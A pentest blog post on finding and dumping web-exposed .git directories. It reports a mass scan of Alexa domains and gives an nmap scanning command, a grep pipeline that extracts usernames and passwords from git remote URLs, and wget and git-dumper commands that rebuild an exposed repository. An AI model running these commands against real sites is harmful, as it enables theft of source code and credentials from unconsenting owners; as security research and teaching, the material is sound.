---
layout: post
title:  "Gathering some information on web exposed git repositories"
date:   2018-08-05
categories: web
---
Hello folks,  
  
Last week, while i was doing recon on some websites, i noticed that we can still found some versioning repositories in production. I found some classic **.git** exposed, and in a lesser extent some **.svn** directories. I decided to gather a bunch of websites caught in the TOP Alexa in order to look for the proportion of .git exposed; with **112332** domains scanned (mixed TLDs), i found **453** .git exposed, which is only **0.4%**. Not bad.  

How to scan for web exposed git directories:  
```nmap --open -PN -n -p80,81,82,8000,8080,443,8443,9443 --script http-git -oA http-git -iL domains.lst```  
  
*N.B: this NSE script will perform HTTP requests thanks to input FQDNs (vhosting)*  
  
Some developers may clone repository specifying their login and password as part of the url, setting this remote origin in the git configuration. For example, once your nmap done, you can spot some login:password playing with this command:  

```
# grep -A1 Remotes http-git.nmap | grep -E ":.*:[^:]*@.*" | awk '{print $2}'
https://apixxxxxx:[redacted]@github.com/apixxxxxx/apixxxxxx.git
http://deploy:[redacted]@10.0.0.4:7990/scm/[redacted]/portal.git
...
```
  
However i was looking for other information, for example:  
 - repository's activity; last commit date for each branch
 - repo directory traversal (great to download the whole repo)
 - highlights remote url
 - displays .git/config and .gitignore files
  
Knowing a bit of a [.git repository layout](https://git-scm.com/docs/gitrepository-layout) will allow to easily retrieve this information even if you don't have any directory traversal. That's why i created a bash script gathering this information which you can find [here](https://github.com/phackt/pentest#user-content-git).  
  
![image1]({{ site.url }}/public/images/git-exposed/gittool.png)
  
If a repository seems interesting and has directory traversal and/or leaks in its remote url some credentials, you can simply download or clone the repository. For example to download the whole repo you can do the following:  
```
wget --recursive --no-parent http://localhost/phackt.github.io/.git/ && \
cd localhost/phackt.github.io && \
git reset --hard
```  
  
Now what happens if you didn't find any creds (most of the cases) and **directory traversal is not enabled** ? I will not reinvent the wheel and advice you to read this [article](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/) amongst others.  

```
# curl -I http://localhost/phackt.github.io/.git/
HTTP/1.1 403 Forbidden
Date: Sat, 11 Aug 2018 17:00:04 GMT
Server: Apache/2.4.33 (Debian)
Content-Type: text/html; charset=iso-8859-1
```  
  
I gave a try to another git dumper tool:  
  
```
git clone https://github.com/phackt/git-dumper && cd git-dumper
pip install -r requirements.txt
./git-dumper.py http://localhost/phackt.github.io/.git/ /tmp/repo
[-] Testing http://localhost/phackt.github.io/.git/HEAD [200]
[-] Testing http://localhost/phackt.github.io/.git/ [403]
[-] Fetching common files
[-] Fetching http://localhost/phackt.github.io/.git/COMMIT_EDITMSG [200]
[-] Fetching http://localhost/phackt.github.io/.git/description [200]
[-] Fetching http://localhost/phackt.github.io/.git/hooks/commit-msg.sample [200]
[-] Fetching http://localhost/phackt.github.io/.git/hooks/post-commit.sample [302]
[-] Fetching http://localhost/phackt.github.io/.git/hooks/post-receive.sample [302]
[-] Fetching http://localhost/phackt.github.io/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://localhost/phackt.github.io/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://localhost/phackt.github.io/.git/hooks/pre-commit.sample [200]
...
[-] Running git checkout .
```  
  
We can now inspect our freshly rebuilt repository:  

```
cd /tmp/repo && ls -1
about.md
categories.md
CNAME
_config.yml
feed.xml
_includes
index.html
_layouts
POC
_posts
public
_sass
```  
  
See you soon,  
Cheers.